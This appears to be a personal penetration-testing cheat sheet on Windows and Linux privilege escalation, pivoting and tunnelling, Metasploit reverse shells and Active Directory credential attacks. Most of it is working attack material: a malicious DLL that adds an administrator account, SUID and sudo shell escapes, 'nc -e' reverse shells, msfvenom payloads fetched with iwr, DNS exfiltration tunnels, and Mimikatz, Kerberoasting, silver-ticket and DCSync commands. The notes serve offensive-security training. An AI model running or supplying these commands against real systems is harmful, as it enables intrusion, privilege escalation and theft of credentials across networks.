DLL are the specular 'Shared Object' on Linux. They are libraries that provide functionalities for executable programs. With the program [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) we can monitor program calls. If we find that a program calls a DLL that is missing, it may be replaced (if we have the correct read/write permissions) by our malicious DLL. We can craft the DLL following [Microsoft's guidelines](https://learn.microsoft.com/it-it/troubleshoot/windows-client/deployment/dynamic-link-library) and insert into the case `DLL_PROCESS_ATTACHED` our code. The code can be similar to the previous code for the manual privilege escalation using Windows services. 

This is the order Windows search for DLLs

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

The following C program can be used to exploit a missing DLL

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int payload;
        payload = system ("net user john Password123! /add");
        payload = system ("net localgroup administrators john /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

```

We will then compile it on the linux machine with the `--shared` option and we load it in the Windows machine **in the path and with the name that Windows expect the DLL to have**. Obviously this works only if we have the **WRITE** permission on that files.

```bash
x86_64-w64-mingw32-gcc calledDll.cpp --shared -o calledDll.dll
```

Trasnfer the file and restart the service with

```powershell
Restart-Service <SERVICENAME>
```

And we will be able to execute a shell as admin with the user john. We could not be able to log-in via RDP because the user may not be in the RDP group.

## Unquoted Service Paths
When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is). In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. <!-- https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae -->

We find unquoted paths with the command

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

We must check if we have write permissions on the executable in order to replace it with a new one.

```powershell
icacls "C:\Program Files\Enterprise Apps\path\to\service.exe"
```

Then if we have permission on the service we can start or stop it with `Start-Service` or `Stop-Service` command. Once we got the paths we can use PowerUp.ps1 for exploting the service. This means the service will be replaced with a malicious exe.

```powershell
Get-UnquotedService
powershell -ep bypass
. .\PowerUp.ps1
```

And finally we run the command to overwrite the service with

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

Now restarting the service will grant us an Administrator account with user john and Password123! as credentials

```powershell
Restart-Service GammaService
```

## Scheduled Tasks
If a task is executed periodically, we can exploit the called program if we have write permissions on it. To seek for scheduled tasks we can run.

```powershell
schtasks /query /fo LIST /v
```

Eventually we can use `findstr` if we want to search for something specific. After that we can replace the program with a simple .exe that creates a new admin user.

## Windows Services
We can watch status of Windows services with [Watch-Command](https://github.com/markwragg/PowerShell-Watch/tree/master)

## Exploits
We can use multiple exploits for Windows, depending on the privileges we got on the system. An example could be [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). We could serve it on the victim machine. If we have `SeImpersonatePrivilege` privilege displayable with `whoami /priv` we could gain Admin privileges with

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```

There is a wide range of this exploits. We can use the whole [Potato Family](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) and perform a Privilege Escalation. A real-life scenario of a Windows privilege escaltion could be exploiting the [`SeBackupPrivilege`](https://juggernaut-sec.com/sebackupprivilege).

## Extracting a Copy of the SAM and SYSTEM Files Using reg.exe
After having gained the Administrator access we cam dump SAM and SYSTEM using reg.exe 

```powershell
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
```

Once copied back on the Kali machine the two files we can dump them with

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

or

```bash
samdump2 SYSTEM SAM
```

This will give us a list of userame:hash that can be cracked using hashcat's NTLM cracking or used for a Pass The Hash attack. Other ways to perform a SAM and SYSTEM credential dumping are explained [here](https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/). 
Many scenarios about dumping SAM ad SYSTEM can be found [here](https://www.hackingarticles.in/credential-dumping-sam/).

## UAC Bypass
Due to unsafe .Net Deserialization we can exploit the system using [UAC Bypass](https://github.com/CsEnox/EventViewer-UACBypass).
```powershell
PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1

PS C:\Windows\Tasks> Invoke-EventViewer 
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe

PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
[+] Running
[1] Crafting Payload
[2] Writing Payload
[+] EventViewer Folder exists
[3] Finally, invoking eventvwr
```

### Additional Tips for Windows PE
Always check installed programs under `C:\Program Files(x86)` or under folders as `Downloads` or `Documents`. We can find exploitable programs (search the program name with searchsploit) or interesting files like Keypass vaults or hashed credentials to be cracked.
Additioally, if we find some non-standard executable program that requires some sort of credentials for it, just do a `strings fileame.exe` because the credentials may be hardcoded into it.

## Linux Privilege Escalation
We can use many tools like [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check) or [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and [LinEnum](https://github.com/rebootuser/LinEnum) to perform an analysis on the possibile privilege escalation vectors on a unix system.

### Crunch
We can perform a password list creation with [Crunch](https://github.com/jim3ma/crunch).

## Commond abused binaries
We can use the [GTFOBins](https://gtfobins.github.io/gtfobins/) to read existent exploitations for binaries in linux. Below more examples.

### SETUID
#### find
find utils can be abused and can execute a shell. We use `-p` to preventing the effective user from being reset. 

 ```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
 ```

#### gdb
 ```bash
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
 ```

#### cp
 ```bash
LFILE=file_to_change
/usr/bin/cp --attributes-only --preserve=all ./cp "$LFILE"
 ```
#### gawk
 ```bash
/usr/bin/gawk 'BEGIN {system("/bin/sh")}'
 ```
### VISUDO
In the file `/etc/sudoers` the sysadmin can specify which commands the users can run with the "sudo" keyword that can be used to run the command with elevated privileges. This could led to a many exploit tecniques that we can find referring to GTFObins. Normally users that can run "sudo" are the users listed in the `sudo group`.

#### apt
 ```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```

#### gcc
 ```bash
sudo gcc -wrapper /bin/sh,-s .
 ```

## System Investigation 
To get all capabilities on file in the system we can use the following commands, also grepping for a specific capability.

 ```bash
/usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null | grep -i setuid
 ```

## Searchexploit for Privilege Escalation
There are many exploits for many linux kernel versions out there. We can check the OS Version with cat /etc/os-release. Famous examples of Linux kernel exploits are [DirtyCow](https://dirtycow.ninja/) or [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits). There is also a recent exploit on the GNU C Library [Looney Tunables](https://github.com/hadrian3689/looney-tunables-CVE-2023-4911) that can work on newer systems as a privilege escalation. An interesting and recent case is the Pkexec Local Privilege Escalation exploit that can be run with [PwnKit](https://github.com/ly4k/PwnKit). Many of this exploits can be found directly with `searchsploit`.

### linPEAS oneliner

 ```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```

## Port Forwarding
Port forwarding is a tecnique that let one machine "bridge" his connection between two networks. In a case where we want to access to the machine B (a database) that is connected to the machine A (a virtual machine) that is connected to the WAN, we want first to exploit and access the machine A in order to reach the second machine, routable only through the network in which there is the machine A.

### Socat
Socat is a useful tool for Port Forwarding. Let's start it in verbose mode with

 ```bash
socat -ddd TCP-LISTEN:<KALI-PORT>,fork TCP:<TARGET-MACHINE>:<TARGET-PORT>
 ```

Next we will connect to it from the Kali VM with the postgresql client that we have only on the kali machine.

 ```bash
psql -h <TARGET-IP> -p <TARGET-PORT> -U postgres
 ```

For an SSH forwarding we can use 

 ```bash
socat -ddd TCP-LISTEN:22,fork TCP:<TARGET-MACHINE>:2222
 ```

And then we can connect to it via

 ```bash
ssh user@<TARGET-IP> -p <TARGET-PORT>
 ```

An useful pre-compiled binary for Windows is [socat-1.7.3.0.exe](https://github.com/tech128/socat-1.7.3.0-windows/tree/master). It has to be run in the folder with all the DLL files. In this way we get a port forwarding from an exploited Windows machine to our Kali machine, and we can connect to the network the Windows machine is connected to.

 ```powershell
.\socat.exe TCP-LISTEN:2222, TCP:192.168.45.223:4444
 ```

An example of revshell for this scenario is

 ```powershell
nc.exe <IP> 2222 -e powershell
 ```

## SSH Tunneling
In cases where socat is not present on the target machine we can still use the SSH tunneling functionality. Port forwarding can be of different types.

### Local Port Forwarding
In this case we run the command on the **TARGET** that becames the "forwarder" between **KALI** and the **IP-B**. This is useful to directly connect **KALI** to the **IP-B** machine, through the connection forwarded from **TARGET** to **IP-A**. The 

 ```bash
ssh -N -L 0.0.0.0:<LOCAL-PORT>:<IP-B>:<REMOTE-PORT> user@<IP-A>
 ```

 ```

KALI ----- TARGET ----- IP-A ----- IP-B [REMOTE-PORT]
 |________________________||__________|

```

### Dynamic Port Forwarding
This lets us forward all ports to the **KALI** machine through the connection forwarded from **TARGET** to **IP-A**. It is useful when we want to perform a network scan and in the IP-A machine there isn't the NMAP binary.

 ```bash
ssh -N -D 0.0.0.0:<LOCAL-PORT> user@<IP-B>
```

```
     
KALI ----- TARGET ----- IP-A ----- IP-B [ALL PORTS]
 |________________________||__________|

```

To use commands we must pass through the SOCKS5 protocol, with the `proxychains` client. This client will forward all traffic to the proxy on the ssh listening port. In this way all the traffic will go through this connection. An example of the usage of proxychains for an nmap scan of the victim's subnet is the following:

 ```bash
proxychains nmap -sV -A -O 192.168.1.0/24
```

Proxychain configuration at `/etc/proxychains.conf` must be configured

 ```bash
[ProxyList]
socks5 <IP-B> <LOCAL-PORT>
 ```

### Remote Port Forwarding
It is more common for firewalls and network administration rules to have only filtering in the inbound traffic, but less filtering on the outbound connections. We can use Remote Port Forwarding to mitigate this defense. The following command is a Remote Port Forwarding from the Kali machine serving the SSH on port LOCAL-PORT and forwarding all the connections to the IP-B on the REMOTE-PORT

 ```bash
ssh -N -R 127.0.0.1:<LOCAL-PORT>:<IP-B>:<REMOTE-PORT> kali@<KALI-IP>
 ```

```
    RECEIVED AS OUTBOUND
 |¯¯¯¯¯¯¯¯¯¯¯>¯¯¯¯¯¯¯¯¯¯¯¯¯|      
KALI ----- TARGET ----- IP-A ----- IP-B [REMOTE PORT]
 |___________<____________||_________|
          OUTBOUND
```

### Remote Dynamic Port Forwarding
This, similar to the Local Dynamic port forwarding lets through the usage of `proxychains` to connect to the <IP-B> on all ports, based redirecting the traffic from the IP-A to the Kali machine on the <LOCAL-PORT> 

 ```bash
ssh -N -R <LOCAL-PORT> kali@<KALI-IP>
```

```
    RECEIVED AS OUTBOUND
 |¯¯¯¯¯¯¯¯¯¯¯>¯¯¯¯¯¯¯¯¯¯¯¯¯|      
KALI ----- TARGET ----- IP-A ----- IP-B [ALL PORTS]
 |___________<____________||_________|
          OUTBOUND
```

### SSHUTTLE
This tools works like a VPN and routes our traffic through the SSH listener we spin on a server. First we have to set up `SOCAT` to listen in the <LOCAL-PORT>, then we can scan the network simply using a normal NMAP.

 ```bash
socat TCP-LISTEN:<LOCAL-PORT>,fork TCP:<REMOTE-IP>:<REMOTE-PORT>
```

Next we run sshuttle specifying the subnets we want to be forwarded through the ssh connection

 ```bash
sshuttle -r database_admin@<REMOTE-IP>:<LOCAL-PORT> <SUBNET-1> <SUBNET-2>
 ```

Now, an NMAP on SUBNET-1 will work as we were in the same network.

### PLINK
Plink is the CLI version of PuTTY that allow us to use SSH Remote Forwarding if the OpenSSH service is missing. The syntax specifies the LOCAL-PORT on which Kali will listen and the REMOTE-PORT the Windows Machine will forward the connection to. This is useful in scenarios in which we have access only through CLI on the Windows Machine 1 and we want to connect via RDP to the Windows Machine 2, reachable only from the first Windows Machine.

```

KALI ---SSH--- WINDOWS-1 ---RDP--- WINDOWS-2
 |________________RDP__________________|

```

A simple plink Remote Forwaring is the following

 ```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:<LOCAL-PORT>:127.0.0.1:<REMOTE-PORT> <KALI-IP>
 ```

### NETSH
From the Microsoft documentation: "Netsh is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running. Netsh commands can be run by typing commands at the netsh shell and be used in batch files or scripts. Remote computers and the local computer can be configured by using netsh commands. 
First we must add the interface proxy with

```powershell
netsh interface portproxy add v4tov4 listenport=<LOCA-PORT> listenaddress=<LOCAL-IP> connectport=<REMOTE-PORT> connectaddress=<REMOTE-IP>
```

To show the status of the proxy

```powershell
netsh interface portproxy show all
```

We must allow the firewall rule to open a port in order to use the proxy. For this reason netsh requires Administrator privileges.

```powershell
netsh advfirewall firewall add rule name="port_forward_ssh_PORT" protocol=TCP dir=in localip=<LOCAL-IP> localport=<LOCAL-PORT> action=allow
```

Now, querying the LOCAL-IP with a connection, will connect the Kali machine to the REMOTE-IP on the REMOTE-PORT. At the end of the attack we should restore the firewall rules with

```powershell
netsh advfirewall firewall delete rule name="port_forward_ssh_PORT"
netsh interface portproxy del v4tov4 listenport=<LOCAL-IP> listenaddress=<LOCAL-IP>
```

### CHISEL
[Chisel](https://github.com/jpillora/chisel) is an HTTP tunnel that forwards all the network connection through the HTTP protocol. It can be used combined with SSH to provide a good way to bypass firewalls that allows only Web traffic. Chisel uses a client/server model and binds the connection to the SOCKS port on the kali machine.

First we start chisel `SERVER` executable. It can happen that the target doesn't have the chisel executable. In this case we must provide it first.

 ```bash
chisel server --port <LOCAL-PORT> --reverse
```

On the `CLIENT` we must bind the connection with the server. The R specifies SOCKS reverse tunneling that bounds on port 1080 on the kali machine by default (`ss -ntplu` to check the bind status)

```bash
/tmp/chisel client <KALI-IP>:<LOCAL-PORT> R:socks > /dev/null 2>&1 &
 ```

Now, on the server we can navigate through the chisel tunnel with HTTP connection. We specify the ProxyCommand option that is the SSH option to specify a SOCKS5 connection and we use ncat, a modified version of netcat that accepts a SOCKS5 connection.

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<REMOTE-IP>
```

Alternately we can use proxychains bound on `127.0.0.1` on port `1080`. This is an example with smbclient.

```bash
proxychains smbclient -L \\<REMOTE-IP>
```

## DNS Exfiltration and DNS Tunneling
DNS tunneling takes advantage of this fact by using DNS requests to implement a command and control channel for malware. Inbound DNS traffic can carry commands to the malware, while outbound traffic can exfiltrate sensitive data or provide responses to the malware operator’s requests. This works because DNS is a very flexible protocol. There are very few restrictions on the data that a DNS request contains because it is designed to look for domain names of websites. Since almost anything can be a domain name, these fields can be used to carry sensitive information. These requests are designed to go to attacker-controlled DNS servers, ensuring that they can receive the requests and respond in the corresponding DNS replies.

### DNSCAT2
With [dnscat](https://github.com/iagox86/dnscat2) we can use DNS as a tunnel and forward all traffic with DNS requests from one host, to connect a WAN host to an host deep and protected in the internal LAN. The **WAN-HOST** will query the **IP-B** through the DNS tunnel that **IP-A** enstabilish with **WAN-HOST**, using **IP-C** as a resolver.

```
                DNS ------IP-C
                 |     
WAN-HOST ----- IP-A ------IP-B
   |____________||__________|

```

On the internal host, after we gain access to it, we run

```bash
./dnscat <DOMAIN>
```

And on the host in the WAN we run

```bash
dnscat2-server <DOMAIN>
```

Where the **DOMAIN** is a domain that can be resolved in the LAN. Now on the server we can interact with the tunnel created 

```bash
window -i 1
```

And run the command that forwards the **LOCAL-PORT** to the **REMOTE-INTERNAL-IP** using the **REMOTE-PORT**

```bash
listen 127.0.0.1:<LOCAL-PORT> <REMOTE-INTERNAL-IP>:<REMOTE-PORT>
```

Now on the WAN host we can query the **REMOTE-INTERNAL-IP** using the tunnel, with a connection that points to **LOCAL-PORT**

```bash
ssh user@127.0.0.1 -p <LOCAL-PORT>
```

## Metasploit
[Offsec's Metasploit Page](https://www.offsec.com/metasploit-unleashed/) has a very good guide for Metasploit usage.

## Staged Reverse Shell
We create the staged executables that we will transfer on the targets

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe
```

And in msfconsole we start the listener

```bash
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <HOST-IP>
set LPORT <PORT>
set ExitOnSession false
run -j
```

We start the python server to serve the exploit on the machine

```bash
python3 -m http.server <PORT>
```

On the target we download the file and we run the executable

```powershell
iwr -uri http://<HOST-IP>:<PORT>/met.exe -Outfile met.exe
.\met.exe
```

### Oneliner Listener
We can use metasploit also via oneliner commands

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
```

## Autoroute and Proxy
Metasploit can also help us with port forwarding. We can set up the `autoroute module`

```bash
use multi/manage/autoroute
set session <SESSION>
run
```

And then we start the socks proxy

```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
```

In this way all the traffic routed through the exploited machine will be redirected in our 127.0.0.1, port 1080. With proxychains we can run command thorugh the proxy and enumerate the internal network

```bash
proxychains nmap -sT -oN -p 80 192.168.1.0/24 
```

## Active Directory
A directory is a hierarchical structure that stores information about objects on the network. A directory service, such as Active Directory Domain Services (AD DS), provides the methods for storing directory data and making this data available to network users and administrators. For example, AD DS stores information about user accounts, such as names, passwords, phone numbers, and so on, and enables other authorized users on the same network to access this information.

Active Directory stores information about objects on the network and makes this information easy for administrators and users to find and use. Active Directory uses a structured data store as the basis for a logical, hierarchical organization of directory information.
List users in domain

```powershell
net user /domain
```

Enumerate user in domain

```powershell
net user <USER> /domain
```

List groups in domain

```powershell
net group /domain
```

Enumerate group in domain

```powershell
net group <GROUP> /domain
```

### Active Directory Enumeration
The AD enumeration is a crucial part to get the informations on what is running on the systems joined in the AD network, along with the users and groups. We can use basic .NET functions or directly, if we can download or transfer programs on the machine, use some automated tools.

### CMD Enumeration
[Basic Win CMD for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#domain-info)

### Nice to know: PowerView
PowerView is a very useful tool to enumerate many things in the windows machine and the domain. [Here](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993) there are some useful tricks with it.

### Swiss Army Knife: WADComs
[WADComs](https://wadcoms.github.io/) is a userful tool that gives you an overview of what you have and what you can do with the things that you have.

### PowerSploit
[PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/) is a useful tool that can be used to perform automatic enumeration. It has to be loaded in the system with

```powershell
powershell -ep bypass
Import-Module .\PowerSploit.ps1
```

Domain enumeration

```powershell
Get-NetDomain
```

User enumeration

```powershell
Get-NetUser
```

Groups enumeration

```powershell
Get-NetGroup
```

Get Access Control Entries

```powershell
Get-ObjectAcl -Identity <USERNAME>
```

Convert SID to name

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

Filter Identities for GenericAll ACL

```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

Get-ObjectAcl -Identity stephanie

Enumerate object in the domain, selecting the operating system

```powershell
Get-NetComputer | select operatingsystem
```

To enumerate the machines in the domain with Admin access for our user

```powershell
Find-LocalAdminAccess
```

We can confirm it via

```powershell
Get-NetSession -ComputerName <COMPUTER-NAME>
```

Enumerate Service Principal Names

```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

Or with a builtin tool

```powershell
setspn -L <SERVICE-NAME>
```

### PsLoggedon
[PsLoggedon](https://learn.microsoft.com/it-it/sysinternals/downloads/psloggedon) is a useful tool that checks (if we have the right privileges) the other user sessions in the other systems of the domain.

```powershell
.\PsLoggedon.exe \\<COMPUTER-NAME>
```

### SharpHound and BloodHound
The [https://github.com/BloodHoundAD](https://github.com/BloodHoundAD/) utils are very useful in the AD enumeration for gathering informations about logged on users, and general data collection. `In order to perform succesful enumeration remember to download the right versions of the tools.`
If we are using BloodHound v4.3.1 we must use the relative SharpHound v4.3.1, otherwise this will not work and the import of the audit.zip will be stuck at 0%. Under Collectors/SharpHound.ps1 we can find the correct version supported from the current BloodHound build.

#### [SharpHound](https://github.com/BloodHoundAD/SharpHound)
SharpHound is used for the data collection part.

We first import it with

```powershell
Import-Module .\SharpHound.ps1
```

And we run the script, saving information in a ZIP file for easy transfer in our <PATH>

```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory <PATH> -OutputPrefix "audit"
```

For a SMB enumeration we can list the shares and check if we can access them

```powershell
Find-DomainShare
```

If in the sares we find some old credentials, encrypted with AES-256 we can decrypt it in the kali machine with

```powershell
gpp-decrypt <CREDENTIALS>
```

#### [BloodHound](https://github.com/BloodHoundAD/BloodHound)
Is a useful graphical interface for printing the SharpHound retrieved data. It can print various information and make a diagram on what victim target first to gain AD Admin access. Here we can list users groups, sessions etc. The element displayed with the full SID are local object of the machines.

A useful RAW query to list all computer in a domain is the following

```script
MATCH(m:Computer) RETURN m
```

To list all users

```script
MATCH(m:User) RETURN m
```

Find active session for users and bind them to the computer

```script
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

Delete data from Neo4J

```script
match (a) -[r] -> () delete a, r
match (a) delete a
```

# Active Directory Authentication

## NTLM
<!-- https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/ -->
Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password. Despite known vulnerabilities, NTLM remains widely deployed even on new systems in order to maintain compatibility with legacy clients and servers. While NTLM is still supported by Microsoft, it has been replaced by Kerberos as the default authentication protocol in Windows 2000 and subsequent Active Directory (AD) domains. 

    - The user shares their username, password and domain name with the client.
    - The client develops a scrambled version of the password — or hash — and deletes the full password.
    - The client passes a plain text version of the username to the relevant server.
    - The server replies to the client with a challenge, which is a 16-byte random number.
    - In response, the client sends the challenge encrypted by the hash of the user’s password.
    - The server then sends the challenge, response and username to the domain controller (DC).
    - The DC retrieves the user’s password from the database and uses it to encrypt the challenge.
    - The DC then compares the encrypted challenge and client response. If these two pieces match, then the user is authenticated and access is granted.

 <p align="center">
  <img src="img/ntlm.png" />
</p>

 
## Kerberos
<!-- https://www.fortinet.com/it/resources/cyberglossary/kerberos-authentication -->
Kerberos authentication is currently the default authorization technology used by Microsoft Windows. It provides a credible security solution for businesses of all sizes. 
Kerberos uses symmetric key cryptography and a key distribution center (KDC) to authenticate and verify user identities. A KDC involves three aspects:

    - A ticket-granting server (TGS) that connects the user with the service server (SS)
    - A Kerberos database that stores the password and identification of all verified users 
    - An authentication server (AS) that performs the initial authentication 

During authentication, Kerberos stores the specific ticket for each session on the end-user's device. Instead of a password, a Kerberos-aware service looks for this ticket. Kerberos authentication takes place in a Kerberos realm, an environment in which a KDC is authorized to authenticate a service, host, or user. 

Kerberos authentication is a multistep process that consists of the following components: 

    - The client who initiates the need for a service request on the user's behalf 
    - The server, which hosts the service that the user needs access to
    - The AS, which performs client authentication. If authentication is successful, the client is issued a ticket-granting ticket (TGT) or user authentication token, which is proof that the client has been authenticated. 
    - The KDC and its three components: the AS, the TGS, and the Kerberos database
    - The TGS application that issues service tickets 
    
 <p align="center">
  <img src="img/kerberos.png" />
</p>

## Get tickets and passwords with Mimikatz
In modern versions of Windows the user hashes are stored in the Local Security Authority Subsystem Service or [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
We can dump sensitive informations about accesses with Mimikatz. We can run Mimikatz with

```powershell
.\mimikatz.exe
```

We can use logonpasswords to dump hashed for all users logged on to the current workstation or server

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Once we've executed the directory listing on a SMB share or we use another ticket-based-service, we can use Mimikatz to show the tickets that are stored in memory by entering

```powershell
privilege::debug
sekurlsa::tickets
```

### [Kerberos attacks cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

## Password Attack
We can do various password attacks on the Windows AD to get the user access credentials

### [PasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
It is a powershell script that tries the passwords for all users in the domain, that has to be launched inside an AD-joined machine.


```powershell
.\Spray-Passwords.ps1 -Pass <PASSWORD>
```

### [Kerbrute](https://github.com/ropnop/kerbrute)
From a Linux machine instead we can run AD password attack with Kerbrute. We can use this script also from a Window machine joined in the domain.

```bash
./kerbrute_linux_amd64 passwordspray -d <DOMAIN> domain_users.txt <PASSWORD>
```

Kerbrute can be used also to get a list of users, if the machine is vulnerable to as-rep roasting. Search for valid user without credentials with the following

```bash
kerbrute userenum -d <DOMAIN> usernames.txt
```

or

```bash
kerbrute -domain <DOMAIN> -users users.txt -dc-ip <IP>
```

### [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
Crackmapexec is a tool for password spraying in the Active Directory network. It can be used for example against the SMB service with

```bash
crackmapexec smb <IP> -u users -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
```

List access for shares in the domain for the users in users.txt with passwords passwords.txt

```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt --shares
```

Run crackmapexec through a proxy (eg chisel) and performing a **local authentication** (No Active Directory Authentication)

proxychains crackmapexec smb <IP> -u users.txt -p 'PASSWORD' --continue-on-success --local-auth

Run crackmapexec and dump [LAPS](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/) passwords

```bash
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```

Run crackmapesec to against mssql

```bash
crackmapexec mssql -d <DOMAIN> -u <username> -p <password> -x "whoami"
```

### LDAP
First we run nmap agains ldap server

```bash
nmap --script "ldap* and not brute" $ip -p 389 -v -Pn -sT <IP>
```

Then using ldapsearch we can extract credentials. The -b parameter in the ldapsearch command specifies the base DN (Distinguished Name) for the search. The DN is essentially the starting point in the LDAP directory tree from which the search will begin. Think of it as the root of your search within the LDAP structure. Example taken from [here](https://medium.com/@0xrave/kyoto-proving-grounds-practice-walkthrough-active-directory-820dfcff5ddd).

```bash
ldapsearch -x -h <IP> -b "dc=X,dc=Y"
```

### AS-REP Roasting
If the AD authentication is configured without the Kerberos Preauthentiction enabled<!-- https://medium.com/r3d-buck3t/kerberos-attacks-as-rep-roasting-2549fd757b5 -->, any user can request a TGT. We can use the `impacket-GetNPUsers` util on Kali. A good explaination of this attack can be found [here](https://en.hackndo.com/kerberos-asrep-roasting/).

```bash
impacket-GetNPUsers -dc-ip <IP-DC>  -request -outputfile hashes.asreproast corp.com/<USER>
```

AS-Rep roasting tickets (TGT) has this format: `$krb5asrep$23$`.

In the powershell the specular program is [Rubeus](https://github.com/GhostPack/Rubeus)

```powershell
.\Rubeus.exe asreproast /nowrap
```

In both cases we have to know at leas the password of one of the AD users. For this reason this and the following tecniques are **post-exploitation** attacks. When we gain the hash it can be cracked with hashcat.

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Kerberoasting
With kerberoasting we are requesting SPN's TGS to the DC. The user that can access the service, for the Windows AD design, can access also the SPN and then the TGS, in order to use the service. We will abuse a service ticket in order to crack the password of the service account. We can run the attack from Rubeus with a user in the AD, and will be targeted only the **Service Principal Names** linked to the account user.

From the Kali machine we can run the attack with 

```bash
sudo impacket-GetUserSPNs -request -dc-ip <DC-IP> corp.com/<USER>
```

The `-request` flag is requesting the DC a TGS for every SPN the logged user has access to. Dumping the tickets could let us to the password because it contains password of the SPN in hash.
The TGS ticket will begin with this format: `$krb5tgs$23$`.

From the Windows machine we can use Rubeus

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Again now we copy the hash and we crack it with hashat with the Kerberos code

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

### Creating silver tickets
We can use Mimikatz to dump hashes and craft a ticket for services access.

First we take the DOMAIN SID with

```powershell
whoami /user
```
We extract the domain

```txt
corp\user **S-1-5-21-xxxxxxxx-xxxxxxx-xxxxxxxx**-xxxx
```

Then with Mimikatz we dump service hashes

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Here we take the NTLM HASH of the service, for example the `iss_service`. Next we can run the attack inside Mimikatz. In the following case we will target the ISS Microsoft service.

```powershell
kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:http /rc4:<HASH> /user:<USER>
```

Now we can dump our tickets with

```powershell
klist
```

 The ticket will be crated for the admin user and for the local user. We can craft authenticated request to the ISS server.

```powershell
iwr -UseDefaultCredentials <URL>
```

### Domain Controller Synchronization
When the AD has to synchronize the domains, it runs the Directory Replication Service (DRS) Remote Protocol. Because the domain doesnpt verify the origin of the request, we can perform a **dcsync** attack that could dump any user credential in the domain. We can use the `impacket-secretsdump` utility. First we run Mimikatz with the dsync attack.

```powershell
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
```

We crack the NTLM HASH with hashcat

```powershell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt --force
```
